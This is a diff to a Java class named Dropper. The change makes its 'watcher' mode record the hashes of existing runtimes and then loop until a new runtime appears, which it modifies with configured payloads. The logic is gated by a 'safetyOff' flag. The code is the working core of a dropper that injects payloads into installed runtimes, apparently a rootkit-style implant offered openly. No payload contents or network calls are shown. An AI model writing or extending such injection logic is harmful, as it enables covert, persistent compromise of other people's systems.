@@ -258,50 +258,44 @@ public class Dropper {
 		if(debug) System.out.println(configuration);
 		
 		// modify runtimes
+		Set<String> runtimesToIgnore = new HashSet<String>();
 		for(File runtime : getTargets(searchPaths, configuration)){
 			if(debug){
 				System.out.println("Discovered runtime: " + runtime.getAbsolutePath());
 			}
 			if(safetyOff){
 				if(watcher){
-					new Thread(new Runnable(){
-						@Override
-						public void run() {
-							try {
-								String hash = sha256(runtime);
-								String hash2 = hash;
-								if(debug){
-									System.out.println("Runtime (" + runtime.getAbsolutePath() + ") hash original: " + hash);
-								}
-								do{
-									if(debug){
-										System.out.println("Sleeping: " + watcherSleepTime + "ms");
-									}
-									Thread.sleep(watcherSleepTime);
-								} while(hash.equals(hash2 = sha256(runtime)));
-								if(debug){
-									System.out.println("Runtime (" + runtime.getAbsolutePath() + ") hash changed: " + hash2);
-								}
-								modifyRuntime(configuration, payloads, runtime);
-							} catch (NoSuchAlgorithmException e) {
-								e.printStackTrace();
-								return;
-							} catch (IOException e) {
-								System.err.println("Unabled to hash " + runtime.getAbsolutePath() + ", sleeping for an iteration...");
-								e.printStackTrace();
-							} catch (InterruptedException e) {
-								if(debug){
-									System.err.println("Unabled to sleep thread.");
-									e.printStackTrace();
-								}
-							}
-						}
-					}).start();
+					try {
+						runtimesToIgnore.add(sha256(runtime));
+					} catch (Exception e) {
+						// skipping runtime
+					}
 				} else {
 					modifyRuntime(configuration, payloads, runtime);
 				}
 			}
 		}
+		
+		if (safetyOff && watcher) {
+			boolean searching = true;
+			while (searching) {
+				for (File runtime : getTargets(searchPaths, configuration)) {
+					try {
+						if (!runtimesToIgnore.contains(sha256(runtime))) {
+							if (debug) {
+								System.out.println("Discovered runtime: " + runtime.getAbsolutePath());
+							}
+
+							searching = false;
+							modifyRuntime(configuration, payloads, runtime);
+						}
+					} catch (Exception e) {
+						// skipping runtime
+					}
+				}
+			}
+		}
+		
 		if(debug) System.out.println("Finished.");
 	}
 
